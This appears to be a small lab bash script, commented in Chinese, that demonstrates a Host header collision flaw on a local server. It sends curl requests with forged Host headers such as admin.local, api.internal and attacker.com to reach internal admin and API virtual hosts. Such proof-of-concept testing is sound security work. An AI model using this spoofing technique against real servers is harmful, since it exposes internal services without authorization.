#!/bin/bash

echo "🧪 测试 Host 碰撞漏洞..."
echo "========================================"

echo -e "\n1️⃣  正常访问 test.com:"
curl -s -H "Host: test.com" http://localhost:8080/ | grep -o "<title>.*</title>"

echo -e "\n2️⃣  伪造 Host 头 - 访问内部管理后台 (Host 碰撞！):"
curl -s -H "Host: admin.local" http://localhost:8080/ | grep -o "<title>.*</title>"

echo -e "\n3️⃣  伪造 Host 头 - 访问内部 API (Host 碰撞！):"
curl -s -H "Host: api.internal" http://localhost:8080/

echo -e "\n4️⃣  任意域名 (会被第一个 server 处理):"
curl -s -H "Host: attacker.com" http://localhost:8080/ | grep -o "<title>.*</title>"

echo -e "\n5️⃣  查看响应头 (验证 X-Server):"
echo "   test.com:"
curl -s -I -H "Host: test.com" http://localhost:8080/ | grep "X-Server"
echo "   admin.local:"
curl -s -I -H "Host: admin.local" http://localhost:8080/ | grep "X-Server"
echo "   api.internal:"
curl -s -I -H "Host: api.internal" http://localhost:8080/ | grep "X-Server"

echo -e "\n========================================"
echo "✅ 测试完成！"